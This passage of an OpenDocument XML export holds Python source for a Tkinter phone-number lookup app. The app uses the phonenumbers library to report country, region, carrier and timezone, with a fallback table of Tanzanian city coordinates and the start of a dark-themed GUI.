      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def __init__(self, use_online_geocoding: bool = True, cache_results: bool = True):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Initialize the tracker.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>use_online_geocoding: Whether to use online Nominatim for coordinates</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>cache_results: Whether to cache geocoding results</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.use_online_geocoding = use_online_geocoding</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.cache_results = cache_results</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.geocode_cache = {}</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>logger.info(f"PhoneNumberTracker initialized (online={use_online_geocoding})")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def track(self, phone_number: str) -&gt; PhoneNumberInfo:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Track a phone number and return comprehensive information.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>phone_number: Phone number in international format (e.g., +255712345678)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Returns:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>PhoneNumberInfo object with all available data</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>logger.info(f"Tracking phone number: {phone_number}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Initialize result object</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>result = PhoneNumberInfo(</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>raw_number=phone_number,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>valid=False,</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>lookup_timestamp=datetime.now().isoformat()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Step 1: Validate and parse</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>if not validate_phone_number(phone_number):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>logger.warning(f"Invalid phone number format: {phone_number}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>return result</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>parsed = phonenumbers.parse(phone_number, None)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Check if number is valid</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>if not phonenumbers.is_valid_number(parsed):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>logger.warning(f"Invalid phone number (failed validation): {phone_number}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>return result</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>result.valid = True</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>result.country_code = parsed.country_code</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>result.national_number = parsed.national_number</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="12"/># Step 2: Get basic location (country/city)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>result.country_name = geocoder.country_name_for_number(parsed, "en")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>result.location = geocoder.description_for_number(parsed, "en")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Step 3: Get carrier information</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>result.carrier_name = carrier.name_for_number(parsed, "en")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Step 4: Get timezone(s)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>tz_names = timezone.time_zones_for_number(parsed)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>result.timezones = list(tz_names) if tz_names else None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Step 5: Determine number type</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>num_type = phonenumbers.number_type(parsed)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>result.number_type = self.NUMBER_TYPES.get(num_type, "Unknown")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/># Step 6: Get coordinates</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>coords = self._get_coordinates(result.location or result.country_name)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>if coords:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>result.latitude, result.longitude = coords</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/># Step 7: Get local time if coordinates available</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>if result.timezones:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="20"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="24"/>tz = pytz.timezone(result.timezones[0])</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="24"/>result.local_time = datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="20"/>except Exception as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="24"/>logger.error(f"Error getting local time: {e}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>logger.info(f"Successfully tracked number: {result}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>except phonenumbers.NumberParseException as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>logger.error(f"Number parse error: {e}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>logger.error(f"Unexpected error tracking number: {e}", exc_info=True)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return result</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def _get_coordinates(self, location_name: str) -&gt; Optional[Tuple[float, float]]:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Get coordinates for a location name.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Uses cached results first, then fallback database, then online lookup.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>location_name: Name of location (city/country)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Returns:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>Tuple of (latitude, longitude) or None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if not location_name:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Check cache first</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if self.cache_results and location_name in self.geocode_cache:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>logger.debug(f"Cache hit for {location_name}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return self.geocode_cache[location_name]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Check fallback database</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="8"/>if location_name in CITY_CENTERS:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>coords = CITY_CENTERS[location_name]</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>logger.debug(f"Found in fallback database: {location_name} -&gt; {coords}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>if self.cache_results:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>self.geocode_cache[location_name] = coords</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>return coords</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Try online geocoding if enabled</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>if self.use_online_geocoding:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>try:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>coords = get_coordinates_from_location(location_name)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>if coords:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="20"/>logger.debug(f"Online geocoding successful: {location_name} -&gt; {coords}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="20"/>if self.cache_results:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="24"/>self.geocode_cache[location_name] = coords</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="20"/>return coords</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>except Exception as e:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="16"/>logger.error(f"Online geocoding failed for {location_name}: {e}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def get_lookup_history(self, limit: int = 10) -&gt; List[Dict]:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Retrieve recent lookup history from log file.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>limit: Maximum number of history entries</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Returns:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="12"/>List of lookup records</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Implementation would parse logs or database</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># For brevity, returns empty list</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return []</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Singleton instance for application-wide use</text:p>
      <text:p text:style-name="Preformatted_20_Text">_tracker_instance = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">def get_tracker() -&gt; PhoneNumberTracker:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Get or create the global tracker instance."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>global _tracker_instance</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if _tracker_instance is None:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>_tracker_instance = PhoneNumberTracker()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return _tracker_instance</text:p>
      <text:p text:style-name="Preformatted_20_Text">File: src/data/city_centers.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">"""</text:p>
      <text:p text:style-name="Preformatted_20_Text">Fallback database of city coordinates.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Used when online geocoding fails or is disabled.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Sources: GeoNames, OpenStreetMap, Wikipedia</text:p>
      <text:p text:style-name="Preformatted_20_Text">"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">CITY_CENTERS = {</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Tanzania - Major cities</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Dar es Salaam": (-6.7924, 39.2083),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Dodoma": (-6.1731, 35.7419), <text:s/># Capital</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Mwanza": (-2.5164, 32.9175),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>"Arusha": (-3.3869, 36.6830),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Mbeya": (-8.8900, 33.4300),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Morogoro": (-6.8247, 37.6630),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Tanga": (-5.0725, 39.0992),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Zanzibar City": (-6.1659, 39.2026),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Kigoma": (-4.8769, 29.6267),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Moshi": (-3.3349, 37.3404),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Tabora": (-5.0425, 32.8197),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Iringa": (-7.7680, 35.6956),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Bukoba": (-1.3322, 31.8122),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Songea": (-10.6833, 35.6500),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Lindi": (-10.0000, 39.7167),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Mtwara": (-10.2667, 40.1833),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Rukwa": (-8.0000, 31.3333),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Katavi": (-6.5000, 31.5000),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Njombe": (-9.3333, 34.7667),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Geita": (-2.8667, 32.1667),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Simiyu": (-2.9833, 33.7833),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Kagera": (-2.0000, 31.5000),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Shinyanga": (-3.6636, 33.4211),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Pwani": (-7.0000, 39.0000),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Manyara": (-4.7500, 36.6667),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Kilimanjaro": (-3.0000, 37.3333),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Pemba North": (-5.0000, 39.7500),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Pemba South": (-5.3333, 39.7500),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Unguja North": (-6.0000, 39.3333),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Unguja South": (-6.3333, 39.5000),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Mjini Magharibi": (-6.1667, 39.2000),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Other countries (partial)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"United States": (39.8283, -98.5795), <text:s/># Geographic center</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"United Kingdom": (54.7024, -3.2766),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Germany": (51.1657, 10.4515),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"France": (46.6034, 1.8883),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Kenya": (-1.2864, 36.8172),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Uganda": (1.3733, 32.2903),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Rwanda": (-1.9403, 29.8739),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Burundi": (-3.3731, 29.9189),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"South Africa": (-30.5595, 22.9375),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Nigeria": (9.0820, 8.6753),</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"Ghana": (7.9465, -1.0232),</text:p>
      <text:p text:style-name="Preformatted_20_Text">}</text:p>
      <text:p text:style-name="Preformatted_20_Text">File: src/utils/validators.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">"""</text:p>
      <text:p text:style-name="Preformatted_20_Text">Input validation utilities.</text:p>
      <text:p text:style-name="Preformatted_20_Text">"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">import re</text:p>
      <text:p text:style-name="Preformatted_20_Text">import logging</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">logger = logging.getLogger(__name__)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">def validate_phone_number(phone_number: str) -&gt; bool:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Basic validation of phone number format.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Args:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>phone_number: Phone number string</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Returns:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>True if format appears valid</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if not phone_number:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return False</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Remove common separators</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>cleaned = re.sub(r'[\s\-\(\)]', '', phone_number)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Basic pattern: starts with + followed by 7-15 digits</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>pattern = r'^\+\d{7,15}$'</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if not re.match(pattern, cleaned):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>logger.debug(f"Phone number failed basic validation: {phone_number}")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>return False</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return True</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">def sanitize_phone_number(phone_number: str) -&gt; str:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Clean up phone number input.</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Args:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>phone_number: Raw input</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>Returns:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>Cleaned number with only + and digits</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Remove all non-digit characters except leading +</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>cleaned = re.sub(r'[^\d+]', '', phone_number)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/># Ensure exactly one + at the beginning</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>if cleaned.startswith('+'):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>cleaned = '+' + re.sub(r'\+', '', cleaned[1:])</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>else:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>cleaned = '+' + re.sub(r'\+', '', cleaned)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>return cleaned</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 5: GUI Implementation</text:p>
      <text:p text:style-name="Preformatted_20_Text">File: src/gui/window.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">"""</text:p>
      <text:p text:style-name="Preformatted_20_Text">Main GUI window implementation using Tkinter.</text:p>
      <text:p text:style-name="Preformatted_20_Text">Provides a professional dark-themed interface.</text:p>
      <text:p text:style-name="Preformatted_20_Text">"""</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">import tkinter as tk</text:p>
      <text:p text:style-name="Preformatted_20_Text">from tkinter import ttk, messagebox</text:p>
      <text:p text:style-name="Preformatted_20_Text">from datetime import datetime</text:p>
      <text:p text:style-name="Preformatted_20_Text">import webbrowser</text:p>
      <text:p text:style-name="Preformatted_20_Text">from typing import Optional</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">from src.core.tracker import get_tracker, PhoneNumberInfo</text:p>
      <text:p text:style-name="Preformatted_20_Text">from src.utils.validators import sanitize_phone_number</text:p>
      <text:p text:style-name="Preformatted_20_Text">from src.utils.logger import get_logger</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">logger = get_logger(__name__)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/></text:p>
      <text:p text:style-name="Preformatted_20_Text">class PhoneTrackerGUI:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"""Main application window."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def __init__(self, root):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.root = root</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.root.title("J Phone NoTracker - Phone Number Intelligence")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.root.geometry("700x600")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.root.minsize(600, 500)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Set dark theme</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.setup_theme()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Initialize tracker</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.tracker = get_tracker()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.current_result: Optional[PhoneNumberInfo] = None</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/># Build UI</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.setup_ui()</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>logger.info("GUI initialized")</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/></text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>def setup_theme(self):</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>"""Configure dark theme colors."""</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.bg_color = "#1e1e1e"</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="8"/>self.fg_color = "#ffffff"</text:p>
